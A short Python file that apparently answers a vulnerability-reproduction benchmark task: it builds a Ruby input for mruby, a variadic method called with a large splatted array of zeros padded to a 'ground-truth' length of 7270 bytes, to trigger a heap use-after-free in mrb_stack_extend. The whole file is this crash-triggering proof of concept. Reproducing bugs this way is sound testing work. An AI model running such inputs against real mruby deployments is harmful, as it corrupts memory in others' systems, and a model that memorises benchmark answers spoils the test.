import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability.
        The vulnerability occurs when mrb_stack_extend moves the stack but a pointer
        (regs) is not updated, typically triggered by splat expansion of a large array
        which forces stack reallocation.
        """
        # The PoC structure defines a method accepting variable arguments
        # and calls it with a large splatted array to force stack extension.
        prefix = "def f(*a);end;f(*["
        suffix = "])"
        
        # Target the ground-truth length to ensure the realloc moves the stack
        # (forcing the UAF on the stale pointer).
        target_len = 7270
        overhead = len(prefix) + len(suffix)
        remaining = target_len - overhead
        
        # Construct the array content: "0," repeated N times, then "0"
        # Each entry "0," is 2 bytes. The final "0" is 1 byte.
        # Length = 2 * n + 1
        n = (remaining - 1) // 2
        
        payload = "0," * n + "0"
        
        poc = prefix + payload + suffix
        return poc.encode('utf-8')
